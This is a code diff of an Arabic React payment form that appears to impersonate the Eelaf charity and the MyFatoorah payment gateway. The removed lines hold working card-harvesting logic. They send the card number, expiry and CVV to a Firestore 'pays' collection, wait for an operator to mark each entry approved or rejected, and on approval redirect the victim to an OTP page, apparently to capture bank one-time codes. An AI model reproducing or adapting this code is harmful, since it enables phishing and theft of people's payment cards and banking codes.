@@ -1,82 +1,16 @@
 "use client"
 
-import type React from "react"
-import { useEffect, useState } from "react"
+import { useState } from "react"
 import Image from "next/image"
 import { ChevronDown } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
-import { addData, db } from "@/lib/firebase"
-import { FullPageLoader } from "@/components/fullpageloader"
-import { doc, onSnapshot } from "firebase/firestore"
-import { useRouter } from "next/navigation"
 
-export default function APaymentForm() {
+export default function PaymentForm() {
   const [cardholderName, setCardholderName] = useState("")
   const [cardNumber, setCardNumber] = useState("")
   const [expiryDate, setExpiryDate] = useState("")
-  const [loading, setLoading] = useState(false)
   const [cvv, setCvv] = useState("")
-  const [status, setStatus] = useState("new")
-  const [itemValue, setItemValue] = useState("")
-  const [visitorId, setVisitorId] = useState("")
-  const router = useRouter()
-
-  // Safely access localStorage after component mounts
-  useEffect(() => {
-    // Get item value from localStorage
-    const storedItem = localStorage.getItem("item")
-    if (storedItem) {
-      setItemValue(storedItem)
-    }
-
-    // Get visitor ID from localStorage
-    const storedVisitorId = localStorage.getItem("visitor")
-    if (storedVisitorId) {
-      setVisitorId(storedVisitorId)
-    }
-  }, [])
-
-  // Set up Firestore listener
-  useEffect(() => {
-    if (!visitorId) return
-
-    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
-      if (docSnap.exists()) {
-        const data = docSnap.data()
-        if (data.status) {
-          if (data.status === "approved") {
-            setLoading(false)
-            setStatus(data.status)
-            router.push("/otp")
-          } else if (data.status === "rejected") {
-            setLoading(false)
-            alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
-          }
-        }
-      }
-    })
-
-    return () => unsubscribe()
-  }, [visitorId, router])
-
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault()
-
-    // Get visitor ID from state (which was set from localStorage)
-    if (!visitorId) return
-
-    addData({
-      createdDate: new Date().toISOString(),
-      id: visitorId,
-      cardNumber,
-      expiryDate,
-      cvv,
-      status,
-    })
-
-    setLoading(true)
-  }
 
   return (
     <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
@@ -89,20 +23,18 @@ export default function APaymentForm() {
           <div className="text-xl font-bold text-right text-gray-800">جمعية إيلاف الخيرية</div>
 
           <div className="h-10 w-10 relative">
-            <Image src="/logoelaf.jpg" alt="Eelaf Charity Logo" width={90} height={90} className="object-contain" />
+            <Image
+              src="/placeholder.svg?height=40&width=40"
+              alt="Eelaf Charity Logo"
+              width={40}
+              height={40}
+              className="object-contain"
+            />
           </div>
         </div>
 
         <div className="mb-4">
-          <button className="flex items-center border border-gray-300 rounded-md px-3 py-2 text-sm">
-            <span>د.ك</span>
-            <ChevronDown className="h-4 w-4 ml-1" />
-          </button>
-        </div>
-
-        <div className="text-right mb-2">
-          <span className="text-blue-600 text-3xl font-bold ml-1">{itemValue}</span>
-          <span className="text-gray-600">د.ك</span>
+         
         </div>
 
         <div className="text-right mb-8 text-gray-700 text-sm">
@@ -120,7 +52,7 @@ export default function APaymentForm() {
           </div>
         </div>
 
-        <form className="space-y-4" onSubmit={handleSubmit}>
+        <form className="space-y-4">
           <div>
             <Input
               className="text-right border-gray-300 rounded-md p-3"
@@ -132,19 +64,29 @@ export default function APaymentForm() {
 
           <div className="relative">
             <Input
-              type="tel"
               className="text-right border-gray-300 rounded-md p-3"
               placeholder="رقم البطاقة"
-              maxLength={16}
               value={cardNumber}
               onChange={(e) => setCardNumber(e.target.value)}
             />
             <div className="absolute left-3 top-1/2 transform -translate-y-1/2 flex space-x-1">
               <div className="w-8 h-5 relative">
-                <Image src="/m.png" alt="Mastercard" width={32} height={20} className="object-contain" />
+                <Image
+                  src="/placeholder.svg?height=20&width=32"
+                  alt="Mastercard"
+                  width={32}
+                  height={20}
+                  className="object-contain"
+                />
               </div>
               <div className="w-8 h-5 relative">
-                <Image src="/v.png" alt="Visa" width={32} height={20} className="object-contain" />
+                <Image
+                  src="/placeholder.svg?height=20&width=32"
+                  alt="Visa"
+                  width={32}
+                  height={20}
+                  className="object-contain"
+                />
               </div>
             </div>
           </div>
@@ -154,14 +96,12 @@ export default function APaymentForm() {
               className="text-right border-gray-300 rounded-md p-3"
               placeholder="رقم التحقق"
               value={cvv}
-              maxLength={3}
               onChange={(e) => setCvv(e.target.value)}
             />
             <Input
               className="text-right border-gray-300 rounded-md p-3"
               placeholder="شهر / سنة"
-              maxLength={5}
-              value={expiryDate.length === 2 ? expiryDate + "/" : expiryDate}
+              value={expiryDate}
               onChange={(e) => setExpiryDate(e.target.value)}
             />
           </div>
@@ -174,11 +114,16 @@ export default function APaymentForm() {
         <div className="mt-8 flex justify-center items-center">
           <span className="text-sm text-gray-500 ml-2">مدعوم من</span>
           <div className="h-6 w-24 relative">
-            <Image src="/vercel.svg" alt="MyAtoorah" width={96} height={24} className="object-contain" />
+            <Image
+              src="/placeholder.svg?height=24&width=96"
+              alt="MyAtoorah"
+              width={96}
+              height={24}
+              className="object-contain"
+            />
           </div>
         </div>
       </div>
-      {loading && <FullPageLoader />}
     </div>
   )
 }
